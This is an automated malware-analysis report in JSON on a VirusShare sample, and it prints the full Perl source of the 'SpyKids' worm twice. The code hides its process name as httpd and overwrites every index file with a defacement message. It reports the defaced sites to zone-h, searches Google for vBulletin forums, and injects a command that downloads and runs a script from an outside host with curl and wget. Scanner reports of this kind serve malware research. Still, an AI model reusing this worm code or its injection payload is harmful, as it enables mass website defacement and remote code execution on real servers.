{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "User-Agent": "May download files from the Internet",
            "Windows": "May enumerate application windows",
            "open": "May open a file",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "#!/usr/bin/perl\n\n#####################\n####\n####  ####    ####    ####    ####    ####   ####   #    #    #    #   ####\n####  #    #    #    #    #          #   #     #         #         #    #    #  #     #\n####  ####    #    #    ###      ##        ####   #         ####    ##       ###\n####  #          #    #    #          # #            #    #         #    #    #  #     #\n####  #          ####    ####    #   #    ####    ####   #    #    #   #    ####\n####\n#####################\n#\n#  Desenvolvi este worm\n#  porque briguei com a\n#  namorada e eu tinha\n# que descontar a raiva\n# em alguem, me desculpe\n# se esse algu\ufffdm \ufffd Voc\ufffd\n#\n#####################\n\n\n\nuse IO::Socket::INET;\n$hahaha = $0;\nmy $processo = \"/usr/local/sbin/httpd\";\n$SIG{\"INT\"} = \"IGNORE\";\n$SIG{\"HUP\"} = \"IGNORE\";\n$SIG{\"TERM\"} = \"IGNORE\";\n$SIG{\"CHLD\"} = \"IGNORE\";\n$SIG{\"PS\"} = \"IGNORE\";\n\n$0=\"$processo\".\"\\0\"x16;\nmy $pid=fork;\nexit if $pid;\n\n########################\n#                                           #\n#  procura index                  #\n#                                          #\n#######################\n\nsystem(\"locate index.* >> index\");\nsystem(\"find / -name index.* >> index\");\n\nopen(a,\"<index\");\n@ind = <a>;\nclose(a);\n$b = scalar(@ind);\nfor($a=0;$a<=$b;$a++){\nchomp $ind[$a];\nsystem(\"echo spykids ownz your server > $ind[$a]\");\n}\n\n\n#########################\n#                                              #\n# pega sites e registra           #\n#                                             #\n#########################\n\n`cat /etc/httpd/conf/httpd.conf |grep ServerName >> sites`;\n\n\nopen(a,\"<sites\");\n@site = <a>;\nclose(a);\n\n$b = scalar(@site);\n\nfor($a=0;$a<=$b;$a++)\n{\n$site[$a] =~ s/#//g;\n$site[$a] =~ s/servername//g;\n$site[$a] =~ s/ServerName//g;\n$site[$a] =~ s/ //g;\n$testa = IO::Socket::INET->new(PeerAddr => $site[$a], PeerPort => 80, Proto => \"tcp\") or next;\nprint $testa \"GET / HTTP/1.0\\n\\n\";\nprint $testa \"Host: $site\";\nprint $testa \"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.0.1) Gecko/20020823 Netscape/7.0\";\nprint $testa \"Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,text/css,*/*;q=0.1\";\nprint $testa \"Accept-Language: pt-br, pt;q=0.50\";\nprint $testa \"Accept-Encoding: gzip, deflate, compress;q=0.9\";\nprint $testa \"Accept-Charset: ISO-8859-1, utf-8;q=0.66, *;q=0.66\";\nprint $testa \"Keep-Alive: 300\";\nprint $testa \"Connection: keep-alive\";\n@ow = <$testa>;\nclose($teste);\n$ae = \"@ow\";\nif($ae =~/spykids/i){ \n$sock = IO::Socket::INET->new(PeerAddr => \"www.zone-h.org\", PeerPort => 80, Proto => \"tcp\") or die \"nao conectou\";\nprint $sock \"POST /en/defacements/notify HTTP/1.0\\r\\n\";\nprint $sock \"Accept: */*\\r\\n\";\nprint $sock \"Referer: http://www.zone-h.org/en/defacements/notify\\r\\n\";\nprint $sock \"Accept-Language: pt-br\\r\\n\";\nprint $sock \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\nprint $sock \"Connection: Keep-Alive\\r\\n\";\nprint $sock \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\r\\n\";\nprint $sock \"Host: www.zone-h.org\\r\\n\";\nprint $sock \"Content-Length: 385\\r\\n\";\nprint $sock \"Pragma: no-cache\\r\\n\";\nprint $sock \"\\r\\n\";\nprint $sock \"notify_defacer=SpyKids&notify_domain=http%3A%2F%2F$site[$a]&notify_hackmode=18&notify_reason=5&notify=+OK+\\r\\n\";\n\nclose($sock);\n}\n}\n\n\n#########################\n#                                              #\n#  worm aws.spykids              #\n#                                             #\n########################\nwhile(1){\n$cmd = '/misc.php?do=page&template={${system(%22cd%20/tmp;curl%20-O%20http://compras.el-nacional.com/spykids.txt%20;perl%20spykids.txt%20;rm%20-rf%20spykids*;%20wget%20http://compras.el-nacional.com/spykids.txt;%20perl%20spykids.txt;%20rm%20-rf%20%20spykids*%22)}}';\n\n\n\n\n@site = \"\";\n$a=0;\n@dom = (\".ar\",\".au\",\".aw\",\".ax\",\".az\",\".ba\",\".bb\",\".bd\",\".be\",\".bf\",\".bg\",\".bh\",\".bi\",\".bj\",\".bm\",\".bn\",\".bo\",\".br\",\".bs\",\".bt\",\".bv\",\".bw\",\".by\",\".bz\",\".ca\",\".cc\",\".cd\",\".cf\",\".cg\",\".ch\",\".ci\",\".ck\",\".cl\",\".cm\",\".cn\",\".co\",\".cr\",\".cs\",\".cu\",\".cv\",\".cx\",\".cy\",\".cz\",\".de\",\".dj\",\".dk\",\".dm\",\".do\",\".dz\",\".ec\",\".ee\",\".eg\",\".eh\",\".er\",\".es\",\".et\",\".fi\",\".fj\",\".fk\",\".fm\",\".fo\",\".fr\",\".ga\",\".gb\",\".gd\",\".ge\",\".gf\",\".gg\",\".gh\",\".gi\",\".gl\",\".gm\",\".gn\",\".gp\",\".gq\",\".gr\",\".gs\",\".gt\",\".gu\",\".gw\",\".gy\",\".hk\",\".hm\",\".hn\",\".hr\",\".ht\",\".hu\",\".id\",\".ie\",\".il\",\".im\",\".in\",\".io\",\".iq\",\".ir\",\".is\",\".it\",\".je\",\".jm\",\".jo\",\".jp\",\".ke\",\".kg\",\".kh\",\".ki\",\".km\",\".kn\",\".kp\",\".kr\",\".kw\",\".ky\",\".kz\",\".la\",\".lb\",\".lc\",\".li\",\".lk\",\".lr\",\".ls\",\".lt\",\".lu\",\".lv\",\".ly\",\".ma\",\".mc\",\".md\",\".mg\",\".mh\",\".mk\",\".ml\",\".mm\",\".mn\",\".mo\",\".mp\",\".mq\",\".mr\",\".ms\",\".mt\",\".mu\",\".mv\",\".mw\",\".mx\",\".my\",\".mz\",\".na\",\".nc\",\".ne\",\".nf\",\".ng\",\".ni\",\".nl\",\".no\",\".np\",\".nr\",\".nu\",\".nz\",\".om\",\".pa\",\".pe\",\".pf\",\".pg\",\".ph\",\".pk\",\".pl\",\".pm\",\".pn\",\".pr\",\".ps\",\".pt\",\".pw\",\".py\",\".qa\",\".re\",\".ro\",\".ru\",\".rw\",\".sa\",\".sb\",\".sc\",\".sd\",\".se\",\".sg\",\".sh\",\".si\",\".sj\",\".sk\",\".sl\",\".sm\",\".sn\",\".so\",\".sr\",\".st\",\".sv\",\".sy\",\".sz\",\".tc\",\".td\",\".tf\",\".tg\",\".th\",\".tj\",\".tk\",\".tl\",\".tm\",\".tn\",\".to\",\".tp\",\".tr\",\".tt\",\".tv\",\".tw\",\".tz\",\".ua\",\".ug\",\".uk\",\".um\",\".us\",\".uy\",\".uz\",\".va\",\".vc\",\".ve\",\".vg\",\".vi\",\".vn\",\".vu\",\".wf\",\".ws\",\".ye\",\".yt\",\".yu\",\".za\",\".zm\",\".zw\");\nforeach $dom (@dom){\n$site = \"www.google.com\";\nopen(a,\">pra.txt\");\nprint a \"\";\nclose(a);\n############### google\n\nfor($n=0;$n<1000;$n += 100){\n$sock = IO::Socket::INET->new(PeerAddr=>\"$site\",PeerPort=>\"80\",Proto=>\"tcp\") or next;\nprint $sock \"GET h/search?q=%22Powered+by%3A+vBulletin%22inurl%3A$dom&num=100&hl=en&lr=&as_qdr=all&start=$n&sa=N HTTP/1.0\\n\\n\";\nprint $sock \"Host: www.google.com\";\nprint $sock \"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.0.1) Gecko/20020823 Netscape/7.0\";\nprint $sock \"Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,text/css,*/*;q=0.1\";\nprint $sock \"Accept-Language: pt-br, pt;q=0.50\";\nprint $sock \"Accept-Encoding: gzip, deflate, compress;q=0.9\";\nprint $sock \"Accept-Charset: ISO-8859-1, utf-8;q=0.66, *;q=0.66\";\nprint $sock \"Keep-Alive: 300\";\nprint $sock \"Connection: keep-alive\";\n@resu = <$sock>;\nclose($sock);\n$ae = \"@resu\";\nwhile ($ae=~ m/<a href=.*?>.*?<\\/a>/){\n$ae=~ s/<a href=(.*?)>.*?<\\/a>/$1/;\n$uber=$1;\nif ($uber !~/translate/)\n   {\n    if ($uber !~ /cache/)\n{\nif ($uber !~ /\"/)\n{\n if ($uber !~ /google/)\n {\n if ($uber !~ /216/)\n {\n if ($uber =~/http/)\n {\n\n  substr($uber,0,7) = \"\";\n  $nu = rindex $uber, '/';\n  $uber = substr($uber,0,$nu);\n  \n\n  open(a,\">>pra.txt\");\n  print a \"$uber\\n\";\n  close(a);\n\n}}}}}}\n}\n}\n$ark = \"pra.txt\";\n@si = \"\";\nopen (arquivo,\"<$ark\");\n@si = <arquivo>;\nclose(arquivo);\n$novo =\"\"; \nforeach (@si){\nif (!$si{$_})\n{ \n$novo .= $_;\n$si{$_} = 1;\n}\n}\nopen (arquivo,\">$ark\");\nprint arquivo $novo;\nclose(arquivo);\nopen(a,\"<pra.txt\");\n@site = <a>;\nclose(a);\n\nforeach $site (@site){\nchomp $site;\n\n($site, $dir) = split('/',$site);\n\n\n$soc = IO::Socket::INET->new(PeerAddr => $site, PeerPort => 80, Proto => \"tcp\") or next;\nprint $soc \"GET /$dir$cmd HTTP/1.0\\n\\n\";\nprint $soc \"Host: $site\";\nprint $soc \"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.0.1) Gecko/20020823 Netscape/7.0\";\nprint $soc \"Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,text/css,*/*;q=0.1\";\nprint $soc \"Accept-Language: pt-br, pt;q=0.50\";\nprint $soc \"Accept-Encoding: gzip, deflate, compress;q=0.9\";\nprint $soc \"Accept-Charset: ISO-8859-1, utf-8;q=0.66, *;q=0.66\";\nprint $soc \"Keep-Alive: 300\";\nprint $soc \"Connection: keep-alive\";\nclose($soc);\n\n}\n}\n}\n\n\n"
    },
    "filename": "VirusShare_2bc9d3bf50217bfc7bb0886174d8be54",
    "filesize": 7820,
    "filetype": "Perl script text executable",
    "hashes": {
        "md5": "2bc9d3bf50217bfc7bb0886174d8be54",
        "sha1": "84672786df9a6d538b3ccc48aa8f253af24db435",
        "sha256": "9659babf38c574939c04592bbf8d780a93e679dfe927732926658f528380d6f0"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/usr/bin/perl",
            "#####################",
            "####",
            "####  ####    ####    ####    ####    ####   ####   #    #    #    #   ####",
            "####  #    #    #    #    #          #   #     #         #         #    #    #  #     #",
            "####  ####    #    #    ###      ##        ####   #         ####    ##       ###",
            "####  #          #    #    #          # #            #    #         #    #    #  #     #",
            "####  #          ####    ####    #   #    ####    ####   #    #    #   #    ####",
            "####",
            "#####################",
            "#  Desenvolvi este worm",
            "#  porque briguei com a",
            "#  namorada e eu tinha",
            "# que descontar a raiva",
            "# em alguem, me desculpe",
            "# se esse algum  Voc",
            "#####################",
            "use IO::Socket::INET;",
            "$hahaha = $0;",
            "my $processo = \"/usr/local/sbin/httpd\";",
            "$SIG{\"INT\"} = \"IGNORE\";",
            "$SIG{\"HUP\"} = \"IGNORE\";",
            "$SIG{\"TERM\"} = \"IGNORE\";",
            "$SIG{\"CHLD\"} = \"IGNORE\";",
            "$SIG{\"PS\"} = \"IGNORE\";",
            "$0=\"$processo\".\"\\0\"x16;",
            "my $pid=fork;",
            "exit if $pid;",
            "########################",
            "#                                           #",
            "#  procura index                  #",
            "#                                          #",
            "#######################",
            "system(\"locate index.* >> index\");",
            "system(\"find / -name index.* >> index\");",
            "open(a,\"<index\");",
            "@ind = <a>;",
            "close(a);",
            "$b = scalar(@ind);",
            "for($a=0;$a<=$b;$a++){",
            "chomp $ind[$a];",
            "system(\"echo spykids ownz your server > $ind[$a]\");",
            "#########################",
            "#                                              #",
            "# pega sites e registra           #",
            "#                                             #",
            "#########################",
            "`cat /etc/httpd/conf/httpd.conf |grep ServerName >> sites`;",
            "open(a,\"<sites\");",
            "@site = <a>;",
            "close(a);",
            "$b = scalar(@site);",
            "for($a=0;$a<=$b;$a++)",
            "$site[$a] =~ s/#//g;",
            "$site[$a] =~ s/servername//g;",
            "$site[$a] =~ s/ServerName//g;",
            "$site[$a] =~ s/ //g;",
            "$testa = IO::Socket::INET->new(PeerAddr => $site[$a], PeerPort => 80, Proto => \"tcp\") or next;",
            "print $testa \"GET / HTTP/1.0\\n\\n\";",
            "print $testa \"Host: $site\";",
            "print $testa \"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.0.1) Gecko/20020823 Netscape/7.0\";",
            "print $testa \"Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,text/css,*/*;q=0.1\";",
            "print $testa \"Accept-Language: pt-br, pt;q=0.50\";",
            "print $testa \"Accept-Encoding: gzip, deflate, compress;q=0.9\";",
            "print $testa \"Accept-Charset: ISO-8859-1, utf-8;q=0.66, *;q=0.66\";",
            "print $testa \"Keep-Alive: 300\";",
            "print $testa \"Connection: keep-alive\";",
            "@ow = <$testa>;",
            "close($teste);",
            "$ae = \"@ow\";",
            "if($ae =~/spykids/i){ ",
            "$sock = IO::Socket::INET->new(PeerAddr => \"www.zone-h.org\", PeerPort => 80, Proto => \"tcp\") or die \"nao conectou\";",
            "print $sock \"POST /en/defacements/notify HTTP/1.0\\r\\n\";",
            "print $sock \"Accept: */*\\r\\n\";",
            "print $sock \"Referer: http://www.zone-h.org/en/defacements/notify\\r\\n\";",
            "print $sock \"Accept-Language: pt-br\\r\\n\";",
            "print $sock \"Content-Type: application/x-www-form-urlencoded\\r\\n\";",
            "print $sock \"Connection: Keep-Alive\\r\\n\";",
            "print $sock \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\r\\n\";",
            "print $sock \"Host: www.zone-h.org\\r\\n\";",
            "print $sock \"Content-Length: 385\\r\\n\";",
            "print $sock \"Pragma: no-cache\\r\\n\";",
            "print $sock \"\\r\\n\";",
            "print $sock \"notify_defacer=SpyKids&notify_domain=http%3A%2F%2F$site[$a]&notify_hackmode=18&notify_reason=5&notify=+OK+\\r\\n\";",
            "close($sock);",
            "#########################",
            "#                                              #",
            "#  worm aws.spykids              #",
            "#                                             #",
            "########################",
            "while(1){",
            "$cmd = '/misc.php?do=page&template={${system(%22cd%20/tmp;curl%20-O%20http://compras.el-nacional.com/spykids.txt%20;perl%20spykids.txt%20;rm%20-rf%20spykids*;%20wget%20http://compras.el-nacional.com/spykids.txt;%20perl%20spykids.txt;%20rm%20-rf%20%20spykids*%22)}}';",
            "@site = \"\";",
            "$a=0;",
            "@dom = (\".ar\",\".au\",\".aw\",\".ax\",\".az\",\".ba\",\".bb\",\".bd\",\".be\",\".bf\",\".bg\",\".bh\",\".bi\",\".bj\",\".bm\",\".bn\",\".bo\",\".br\",\".bs\",\".bt\",\".bv\",\".bw\",\".by\",\".bz\",\".ca\",\".cc\",\".cd\",\".cf\",\".cg\",\".ch\",\".ci\",\".ck\",\".cl\",\".cm\",\".cn\",\".co\",\".cr\",\".cs\",\".cu\",\".cv\",\".cx\",\".cy\",\".cz\",\".de\",\".dj\",\".dk\",\".dm\",\".do\",\".dz\",\".ec\",\".ee\",\".eg\",\".eh\",\".er\",\".es\",\".et\",\".fi\",\".fj\",\".fk\",\".fm\",\".fo\",\".fr\",\".ga\",\".gb\",\".gd\",\".ge\",\".gf\",\".gg\",\".gh\",\".gi\",\".gl\",\".gm\",\".gn\",\".gp\",\".gq\",\".gr\",\".gs\",\".gt\",\".gu\",\".gw\",\".gy\",\".hk\",\".hm\",\".hn\",\".hr\",\".ht\",\".hu\",\".id\",\".ie\",\".il\",\".im\",\".in\",\".io\",\".iq\",\".ir\",\".is\",\".it\",\".je\",\".jm\",\".jo\",\".jp\",\".ke\",\".kg\",\".kh\",\".ki\",\".km\",\".kn\",\".kp\",\".kr\",\".kw\",\".ky\",\".kz\",\".la\",\".lb\",\".lc\",\".li\",\".lk\",\".lr\",\".ls\",\".lt\",\".lu\",\".lv\",\".ly\",\".ma\",\".mc\",\".md\",\".mg\",\".mh\",\".mk\",\".ml\",\".mm\",\".mn\",\".mo\",\".mp\",\".mq\",\".mr\",\".ms\",\".mt\",\".mu\",\".mv\",\".mw\",\".mx\",\".my\",\".mz\",\".na\",\".nc\",\".ne\",\".nf\",\".ng\",\".ni\",\".nl\",\".no\",\".np\",\".nr\",\".nu\",\".nz\",\".om\",\".pa\",\".pe\",\".pf\",\".pg\",\".ph\",\".pk\",\".pl\",\".pm\",\".pn\",\".pr\",\".ps\",\".pt\",\".pw\",\".py\",\".qa\",\".re\",\".ro\",\".ru\",\".rw\",\".sa\",\".sb\",\".sc\",\".sd\",\".se\",\".sg\",\".sh\",\".si\",\".sj\",\".sk\",\".sl\",\".sm\",\".sn\",\".so\",\".sr\",\".st\",\".sv\",\".sy\",\".sz\",\".tc\",\".td\",\".tf\",\".tg\",\".th\",\".tj\",\".tk\",\".tl\",\".tm\",\".tn\",\".to\",\".tp\",\".tr\",\".tt\",\".tv\",\".tw\",\".tz\",\".ua\",\".ug\",\".uk\",\".um\",\".us\",\".uy\",\".uz\",\".va\",\".vc\",\".ve\",\".vg\",\".vi\",\".vn\",\".vu\",\".wf\",\".ws\",\".ye\",\".yt\",\".yu\",\".za\",\".zm\",\".zw\");",
            "foreach $dom (@dom){",
            "$site = \"www.google.com\";",
            "open(a,\">pra.txt\");",
            "print a \"\";",
            "close(a);",
            "############### google",
            "for($n=0;$n<1000;$n += 100){",
            "$sock = IO::Socket::INET->new(PeerAddr=>\"$site\",PeerPort=>\"80\",Proto=>\"tcp\") or next;",
            "print $sock \"GET h/search?q=%22Powered+by%3A+vBulletin%22inurl%3A$dom&num=100&hl=en&lr=&as_qdr=all&start=$n&sa=N HTTP/1.0\\n\\n\";",
            "print $sock \"Host: www.google.com\";",
            "print $sock \"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.0.1) Gecko/20020823 Netscape/7.0\";",
            "print $sock \"Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,text/css,*/*;q=0.1\";",
            "print $sock \"Accept-Language: pt-br, pt;q=0.50\";",
            "print $sock \"Accept-Encoding: gzip, deflate, compress;q=0.9\";",
            "print $sock \"Accept-Charset: ISO-8859-1, utf-8;q=0.66, *;q=0.66\";",
            "print $sock \"Keep-Alive: 300\";",
            "print $sock \"Connection: keep-alive\";",
            "@resu = <$sock>;",
            "close($sock);",
            "$ae = \"@resu\";",
            "while ($ae=~ m/<a href=.*?>.*?<\\/a>/){",
            "$ae=~ s/<a href=(.*?)>.*?<\\/a>/$1/;",
            "$uber=$1;",
            "if ($uber !~/translate/)",
            "   {",
            "    if ($uber !~ /cache/)",
            "if ($uber !~ /\"/)",
            " if ($uber !~ /google/)",
            " if ($uber !~ /216/)",
            " if ($uber =~/http/)",
            "  substr($uber,0,7) = \"\";",
            "  $nu = rindex $uber, '/';",
            "  $uber = substr($uber,0,$nu);",
            "  open(a,\">>pra.txt\");",
            "  print a \"$uber\\n\";",
            "  close(a);",
            "}}}}}}",
            "$ark = \"pra.txt\";",
            "@si = \"\";",
            "open (arquivo,\"<$ark\");",
            "@si = <arquivo>;",
            "close(arquivo);",
            "$novo =\"\"; ",
            "foreach (@si){",
            "if (!$si{$_})",
            "$novo .= $_;",
            "$si{$_} = 1;",
            "open (arquivo,\">$ark\");",
            "print arquivo $novo;",
            "close(arquivo);",
            "open(a,\"<pra.txt\");",
            "@site = <a>;",
            "close(a);",
            "foreach $site (@site){",
            "chomp $site;",
            "($site, $dir) = split('/',$site);",
            "$soc = IO::Socket::INET->new(PeerAddr => $site, PeerPort => 80, Proto => \"tcp\") or next;",
            "print $soc \"GET /$dir$cmd HTTP/1.0\\n\\n\";",
            "print $soc \"Host: $site\";",
            "print $soc \"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.0.1) Gecko/20020823 Netscape/7.0\";",
            "print $soc \"Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,text/css,*/*;q=0.1\";",
            "print $soc \"Accept-Language: pt-br, pt;q=0.50\";",
            "print $soc \"Accept-Encoding: gzip, deflate, compress;q=0.9\";",
            "print $soc \"Accept-Charset: ISO-8859-1, utf-8;q=0.66, *;q=0.66\";",
            "print $soc \"Keep-Alive: 300\";",
            "print $soc \"Connection: keep-alive\";",
            "close($soc);"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://compras.el-nacional.com/spykids.txt%20perl%20spykids.txt%20rm%20-rf%20spykids",
            "http://compras.el-nacional.com/spykids.txt%20perl%20spykids.txt%20rm%20-rf%20%20spykids",
            "http://www.zone-h.org/en/defacements/notify\\r\\n"
        ]
    },
    "time": "0:00:00.344799",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
